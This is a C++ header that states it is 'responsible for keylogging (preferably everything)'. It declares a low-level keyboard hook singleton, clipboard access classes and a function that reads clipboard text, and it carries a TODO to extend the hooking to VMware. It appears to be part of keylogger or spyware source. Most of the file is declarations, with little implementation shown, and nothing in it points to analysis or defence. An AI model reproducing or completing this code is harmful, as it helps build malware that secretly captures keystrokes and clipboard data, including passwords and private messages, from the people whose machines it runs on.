// KeyboardHook.h - Responsible for keylogging (preferably everything)
// TODO: needs to hook vmware
#pragma once
#define KeyboardHook _KeyboardHook::Instance()

class _KeyboardHook
{
public:

	// Initialize the lower-level keyboard hook
	void __fastcall InitKeyboardHook();
	HHOOK hHook{ NULL };
	static _KeyboardHook& Instance() {
		static _KeyboardHook _Handle;
		return _Handle;
	}

};


class Clipboard
{
public:
	Clipboard();
	~Clipboard();
private:
	Clipboard(const Clipboard&);
};


class TextGlobalLock
{
public:
	explicit TextGlobalLock(HANDLE hData)
		: m_hData(hData)
	{
		m_psz = static_cast<const char*>(GlobalLock(m_hData));
		if (!m_psz)
			DEBUG_PRINT(("Can't acquire clipboard lock %d", GetLastError()));
	}
	~TextGlobalLock();
	const char* Get() const;
private:
	HANDLE m_hData;
	const char* m_psz;

	TextGlobalLock(const TextGlobalLock&);
};


std::string GetClipboardText();

